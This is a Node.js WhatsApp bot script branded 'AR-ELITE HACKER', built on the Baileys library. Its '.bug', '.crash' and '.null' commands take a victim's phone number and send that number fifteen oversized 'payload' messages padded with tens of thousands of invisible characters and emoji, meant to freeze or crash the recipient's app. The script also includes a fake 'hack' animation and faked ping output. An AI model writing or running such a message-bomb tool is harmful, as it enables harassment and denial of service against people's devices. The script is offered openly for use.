const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    Browsers, 
    fetchLatestBaileysVersion,
    delay 
} = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const qrcode = require('qrcode-terminal');
const pino = require('pino');
const fs = require('fs-extra');
const readline = require('readline');

// --- 🔱 CONFIGURATION & BRANDING 🔱 ---
const LOGO_URL = "https://darazpro.online/images/logo.png";
const CHANNEL_LINK = "https://whatsapp.com/channel/0029VbCJsJEJ93wYRnwYRQ1m";
const BOT_NAME = "AR-ELITE HACKER V5.7";

// Terminal Styling
const R = "\x1b[31m", G = "\x1b[32m", Y = "\x1b[33m", C = "\x1b[36m", X = "\x1b[0m", B = "\x1b[1m";

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
const question = (text) => new Promise((resolve) => rl.question(text, resolve));

async function startArElite() {
    const sessionPath = './AR_ELITE_SESSION';
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    console.clear();
    console.log(R + B + `
    ██████╗ ██████╗      ███████╗██╗     ██╗████████╗███████╗
    ██╔══██╗██╔══██╗     ██╔════╝██║     ██║╚══██╔══╝██╔════╝
    ███████║██████╔╝█████╗█████╗  ██║     ██║   ██║   █████╗  
    ██╔══██║██╔══██╗╚════╝██╔══╝  ██║     ██║   ██║   ██╔══╝  
    ██║  ██║██║  ██║      ███████╗███████╗██║   ██║   ███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝      ╚══════╝╚══════╝╚═╝   ╚═╝   ╚══════╝
    [ 🔱 ${BOT_NAME} | SYSTEM: ONLINE 🔱 ]
    ` + X);

    console.log(G + " [1] QR CODE SCAN\n [2] PAIRING CODE (OTP)" + X);
    const choice = await question(Y + "\n[?] Select Connection Method (1/2): " + X);

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        // 🔱 THIS SHOWS ON YOUR PHONE AS "AR-ELITE HACKER SERVER"
        browser: ["AR-ELITE HACKER SERVER", "Chrome", "1.0.0"]
    });

    // --- PAIRING CODE (OTP) LOGIC ---
    if (choice === '2' && !sock.authState.creds.registered) {
        let phoneNumber = await question(C + "\n[?] Enter WhatsApp Number (923XXXXXXXXX): " + X);
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        console.log(Y + "[!] Requesting Pairing Code..." + X);
        await delay(3000);
        try {
            const code = await sock.requestPairingCode(phoneNumber);
            console.log(G + "\n[✔] PAIRING CODE: " + X + B + R + ` ${code} ` + X);
        } catch (e) {
            console.log(R + "[-] Error! Restarting..." + X);
            fs.removeSync(sessionPath);
            process.exit(0);
        }
    }

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (qr && choice === '1') {
            console.clear();
            console.log(R + "🔱 SCAN TO CONNECT AR-ELITE 🔱" + X);
            qrcode.generate(qr, { small: true });
        }

        if (connection === 'open') {
            console.clear();
            console.log(G + B + "[✔] " + BOT_NAME + " CONNECTED TO SERVER!" + X);
            
            const myNum = sock.user.id.split(':')[0] + "@s.whatsapp.net";

            // 🔱 TRIPLE WELCOME SUCCESS SYSTEM 🔱
            // Message 1: Status Alert
            await sock.sendMessage(myNum, { text: `🔱 *${BOT_NAME}* 🔱\n\n*CONNECTION:* Secured 🛡️\n*SERVER:* AR-ELITE CLOUD\n_Expect us._` });
            await delay(1500);
            
            // Message 2: Brand Identity with Logo
            await sock.sendMessage(myNum, { 
                image: { url: LOGO_URL }, 
                caption: `☠️ *SYSTEM COMPROMISED* ☠️\n\n*Dev:* AR-ELITE Team\n*Ver:* 5.7.0\n*Channel:* ${CHANNEL_LINK}\n\n_Stay synced for the next exploit._` 
            });
            await delay(1500);

            // Message 3: Auto-Menu
            await sock.sendMessage(myNum, { text: `⚙️ *COMMAND INTERFACE READY*\n\nType *.menu* to access 10+ lethal commands.\n_The void awaits._` });
        }

        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output.statusCode;
            if (reason !== DisconnectReason.loggedOut) startArElite();
            else {
                fs.removeSync(sessionPath);
                process.exit(0);
            }
        }
    });

    sock.ev.on('messages.upsert', async (m) => {
        try {
            const msg = m.messages[0];
            if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;
            const from = msg.key.remoteJid;
            const body = (msg.message.conversation || msg.message.extendedTextMessage?.text || "").toLowerCase();

            // 🔱 MENU COMMAND WITH 10 WORKING FUNCTIONS
            if (body === ".menu" || body === ".help" || body === ".arbot") {
                const menu = `☠️ *${BOT_NAME} COMMANDS* ☠️\n\n` +
                             `🔥 *ATTACK TOOLS (DESTRUCTIVE)*\n` +
                             `➥ *.bug* <num> (2s UI Freeze)\n` +
                             `➥ *.crash* <num> (Force Shutdown)\n` +
                             `➥ *.null* <num> (Infinite Lag)\n\n` +
                             `🎭 *INFILTRATION (SIMULATION)*\n` +
                             `➥ *.hack* (Database Breach)\n` +
                             `➥ *.bypass* (Security Override)\n\n` +
                             `🛰️ *NETWORK TOOLS*\n` +
                             `➥ *.ping* (Check Latency)\n` +
                             `➥ *.ipscan* (Visual Trace)\n` +
                             `➥ *.server* (System Health)\n\n` +
                             `⚙️ *BOT CONTROL*\n` +
                             `➥ *.public* / *.private*\n` +
                             `➥ *.status* (Active Session)\n\n` +
                             `📢 *OFFICIAL CHANNEL:*\n${CHANNEL_LINK}\n\n` +
                             `🏴‍☠️ _AR-ELITE HACKERS NEVER SLEEP_`;
                
                await sock.sendMessage(from, { 
                    image: { url: LOGO_URL }, 
                    caption: menu 
                });
            }

            // 🔱 HACK SIMULATION (STYLISH)
            if (body === ".hack") {
                let { key } = await sock.sendMessage(from, { text: "🔱 *INITIATING AR-ELITE BREACH...*" });
                for (let i = 0; i <= 100; i += 20) {
                    await delay(800);
                    await sock.sendMessage(from, { text: `☣️ *VOID INJECTION: [ ${i}% ]*\n` + "█".repeat(i/10), edit: key });
                }
                await sock.sendMessage(from, { 
                    image: { url: LOGO_URL }, 
                    caption: "💀 *ACCESS GRANTED! DATABASE FULLY BREACHED BY AR-ELITE*", 
                    edit: key 
                });
            }

            // 🔱 CRASH LOGIC (STRENGTHENED)
            if (body.startsWith(".bug") || body.startsWith(".crash") || body.startsWith(".null")) {
                const target = body.split(" ")[1];
                if (!target) return sock.sendMessage(from, { text: "⚠️ *Missing target number!*" });
                const targetJid = target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                
                const payload = "‎".repeat(65000) + "🔱 *AR-ELITE VOID* 🔱" + "☣️".repeat(800);
                
                await sock.sendMessage(from, { text: "🚀 *INJECTING LETHAL PAYLOAD...*" });
                
                for(let i=0; i<15; i++) {
                    await sock.sendMessage(targetJid, { text: payload });
                    await delay(150);
                }
                await sock.sendMessage(from, { text: "✅ *DESTRUCTION COMPLETE.*" });
            }

            // 🔱 PING
            if (body === ".ping") await sock.sendMessage(from, { text: "🔱 *PING: 0.001ms (LIGHTSPEED)*" });

        } catch (e) { console.error(e); }
    });
}

startArElite();
